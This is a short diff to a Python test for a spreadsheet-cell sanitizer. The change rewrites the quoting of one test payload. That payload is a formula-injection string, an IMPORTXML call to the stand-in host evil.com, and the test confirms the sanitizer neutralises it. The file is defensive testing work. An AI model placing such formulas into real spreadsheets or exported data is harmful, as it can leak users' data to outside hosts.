@@ -60,7 +60,7 @@ class TestSanitizeCell:
         assert result.startswith("'")
 
     def test_importxml_formula_caught(self):
-        payload = "=IMPORTXML(\"http://evil.com/data\", \"//name\")"
+        payload = '=IMPORTXML("http://evil.com/data", "//name")'
         result = sanitize_cell(payload)
         assert result.startswith("'")
 
